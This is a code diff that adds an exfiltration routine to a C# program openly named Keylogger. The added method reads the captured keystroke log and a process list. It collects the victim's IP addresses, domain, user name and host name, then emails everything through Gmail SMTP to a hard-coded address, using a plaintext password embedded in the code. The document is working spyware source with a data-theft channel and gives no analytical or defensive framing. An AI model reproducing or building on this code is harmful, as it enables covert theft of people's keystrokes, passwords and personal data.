@@ -13,6 +13,8 @@ using Hooks;
 using System.Diagnostics;
 using System.IO;
 using System.Threading;
+using System.Net;
+using System.Net.Mail;
 
 namespace Keylogger
 {
@@ -129,6 +131,8 @@ namespace Keylogger
             btnStart.Visible = true;
             btnStop.Visible = false;
             timer.Enabled = false;
+            
+            SendNewMessage(filename);
 
         }
 
@@ -171,6 +175,46 @@ namespace Keylogger
         private void btnStop_Click(object sender, EventArgs e)
         {
             Stop();
+        }
+
+        static void SendNewMessage(string path) 
+        {
+            //String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            string filepath = /*folderName+*/ "Processes.txt";
+            String logContents = File.ReadAllText(filepath);
+            String logContentsKeyLogger = File.ReadAllText(path);
+            string emailBody = "";
+            
+            DateTime now = DateTime.Now;
+            string subject = "Message from key logger";
+
+            var host = Dns.GetHostEntry(Dns.GetHostName());
+
+            foreach (var address in host.AddressList)
+            {
+                emailBody += "Address:" + address;
+            }
+
+            emailBody += "\n User" + Environment.UserDomainName + "\\" + Environment.UserName;
+            emailBody += "\nhost" + host;
+            emailBody += "\n time" + now.ToString();
+            emailBody += logContents;
+            emailBody += "**********";
+            emailBody += "\n";
+            emailBody += logContentsKeyLogger;
+
+
+            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
+            MailMessage mailMessage = new MailMessage();
+            mailMessage.From = new MailAddress("testspyboond@gmail.com");
+            mailMessage.To.Add("testspyboond@gmail.com");
+            mailMessage.Subject = subject;
+            client.UseDefaultCredentials = false;
+            client.EnableSsl = true;
+            client.Credentials = new System.Net.NetworkCredential("testspyboond@gmail.com", "123qweewq321");
+            mailMessage.Body = emailBody;
+
+            client.Send(mailMessage);
         }
     }
 }
